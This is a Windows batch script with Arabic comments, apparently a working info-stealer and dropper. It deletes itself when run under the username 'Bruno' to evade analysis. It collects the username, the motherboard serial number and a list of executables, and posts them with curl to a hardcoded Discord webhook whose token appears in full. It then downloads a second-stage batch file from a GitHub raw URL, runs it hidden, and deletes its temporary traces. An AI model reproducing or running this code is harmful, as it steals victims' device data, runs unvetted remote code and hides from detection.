@echo off
setlocal enabledelayedexpansion

:: 1. فحص اسم المستخدم (Anti-Analysis Check)
:: لو اسم المستخدم Bruno، الملف هيمسح نفسه ويقفل فوراً من غير ما يعمل أي حاجة
set "TARGET_USER=Bruno"
if /I "%USERNAME%"=="%TARGET_USER%" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: 2. إعداد الروابط (تأكد من صحتها)
set "WEBHOOK_URL=https://discord.com/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
set "TEMP_FILE=%TEMP%\Result.txt"
set "BAT1_PATH=%TEMP%\1.bat"

:: 3. جمع معلومات الجهاز والملفات
echo === Device Info === > "%TEMP_FILE%"
echo Username: %USERNAME% >> "%TEMP_FILE%"
echo Motherboard ID: >> "%TEMP_FILE%"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"
echo. >> "%TEMP_FILE%"
echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
dir /b /s *.exe >> "%TEMP_FILE%"

:: 4. إرسال البيانات إلى Discord باستخدام curl
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" "%WEBHOOK_URL%"

:: 5. تحميل ملف المرحلة الثانية (1.bat) من جيت هاب وتشغيله
curl -L -o "%BAT1_PATH%" "%BAT1_URL%"
if exist "%BAT1_PATH%" (
    start /b "" cmd /c "%BAT1_PATH%"
)

:: 6. مسح ملف النتائج المؤقت والاختفاء
if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"
exit

